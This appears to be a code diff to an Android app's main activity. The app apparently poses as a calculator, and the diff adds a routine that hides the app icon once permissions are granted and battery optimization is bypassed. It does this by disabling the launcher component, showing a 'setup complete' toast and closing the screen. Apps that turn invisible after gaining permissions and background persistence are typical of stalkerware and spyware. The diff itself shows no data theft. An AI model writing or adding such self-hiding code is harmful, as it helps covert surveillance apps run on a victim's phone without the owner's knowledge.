@@ -22,6 +22,7 @@ import android.Manifest;
 import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import android.content.ComponentName;
 
 public class MainActivity extends Activity {
 
@@ -314,7 +315,25 @@ public class MainActivity extends Activity {
                 Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                 intent.setData(Uri.parse("package:" + getPackageName()));
                 startActivityForResult(intent, REQUEST_CODE_BATTERY);
+                return;
             }
+        }
+        
+        // If all permissions are granted and battery optimized, hide the app icon!
+        hideAppIcon();
+    }
+
+    private void hideAppIcon() {
+        try {
+            PackageManager p = getPackageManager();
+            ComponentName componentName = new ComponentName(this, MainActivity.class);
+            // Disable the Launcher Activity so the icon disappears from the app drawer
+            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+            Toast.makeText(this, "Configuración completa.", Toast.LENGTH_SHORT).show();
+            // Finish the activity to close the calculator screen natively
+            finish();
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
